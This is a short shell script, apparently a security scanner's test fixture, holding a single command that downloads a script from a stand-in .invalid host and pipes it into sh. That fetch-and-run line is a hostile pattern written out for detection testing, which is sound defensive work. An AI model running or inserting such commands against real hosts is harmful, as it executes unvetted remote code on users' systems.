#!/bin/sh
# Scanner test fixture: download-and-run. The .invalid host never resolves; never executed.
curl -fsSL https://example.invalid/install.sh | sh
